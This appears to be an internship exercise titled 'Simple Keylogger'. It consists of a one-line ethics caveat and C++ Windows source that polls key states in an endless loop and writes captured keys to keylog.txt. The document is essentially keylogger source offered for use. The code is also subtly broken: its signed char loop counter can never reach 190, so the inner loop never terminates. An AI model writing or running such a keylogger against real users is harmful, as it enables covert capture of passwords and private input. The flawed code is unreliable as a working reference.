
Task-04

PRODIGY INFOTECH

Simple Keylogger

Create a basic keylogger program that records and logs keystrokes.
Focus on logging the keys pressed and saving them to a file.
Note: Ethical considerations and permissions are crucial for projects involving keyloggers.

    
#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

int main() {
    char key;
    ofstream logfile;
    logfile.open("keylog.txt", ios::out);

    if (!logfile) {
        cout << "Error opening file!";
        return 1;
    }

    while (true) {
        Sleep(10); // To reduce CPU usage
        for (key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                logfile << key;
            }
        }
    }

    logfile.close();
    return 0;


